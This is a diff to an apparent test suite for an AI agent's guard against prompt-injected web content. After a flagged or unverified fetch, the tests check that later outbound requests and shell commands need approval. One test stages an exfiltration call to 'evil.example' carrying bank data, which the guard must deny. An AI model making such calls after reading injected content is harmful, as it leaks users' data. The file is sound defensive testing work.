@@ -88,7 +88,7 @@ describe('output guard on the result path', () => {
 
   it('a flagged result taints the run: the next outbound call needs approval (and is not made when denied)', async () => {
     page.content = INJECTED
-    const { call, ask } = setup()
+    const { call, ask } = setup({ guard: llmFlag })
     await call('web_fetch', { url: 'https://a.example' })
     expect(await call('web_fetch', { url: 'https://evil.example/?d=bank' })).toEqual({ denied: true })
     expect(ask).toHaveBeenCalledTimes(1)
@@ -102,10 +102,32 @@ describe('output guard on the result path', () => {
 
   it('a flagged result takes exec off its allowlist fast path too', async () => {
     page.content = INJECTED
-    const { call, ask } = setup()
+    const { call, ask } = setup({ guard: llmFlag })
     await call('web_fetch', { url: 'https://a.example' })
     await call('exec', { command: 'ls' })
     expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'exec', title: 'Command after flagged content', allowlistable: false })
+  })
+
+  it('follow-up N2: a FAIL-CLOSED flag (judge off here) taints the run `unverified` — gated all the same, titled for it, its DTO marked', async () => {
+    page.content = INJECTED
+    const seen: string[][] = []
+    const { call, ask, events } = setup({ onTaint: t => seen.push(t.sources) })
+    await call('web_fetch', { url: 'https://a.example' })
+    expect(events[0]!.outputWarning).toMatchObject({ unverified: true })
+    expect(seen).toEqual([['unverified']])
+    expect(await call('web_fetch', { url: 'https://b.example' })).toEqual({ denied: true })
+    expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'web_fetch', title: 'Web request after unchecked content', allowlistable: false })
+    await call('exec', { command: 'ls' })
+    expect(ask.mock.calls[1]![0]).toMatchObject({ tool: 'exec', title: 'Command after unchecked content', allowlistable: false })
+  })
+
+  it('follow-up N2: a REAL verdict is `flagged` and its DTO is not marked unverified', async () => {
+    page.content = INJECTED
+    const seen: string[][] = []
+    const { call, events } = setup({ guard: llmFlag, onTaint: t => seen.push(t.sources) })
+    await call('web_fetch', { url: 'https://a.example' })
+    expect(events[0]!.outputWarning?.unverified).toBeUndefined()
+    expect(seen).toEqual([['flagged']])
   })
 
   it('C1: the heading follows the taint source — mail, a tainted workspace, flagged content; the lead names each', async () => {
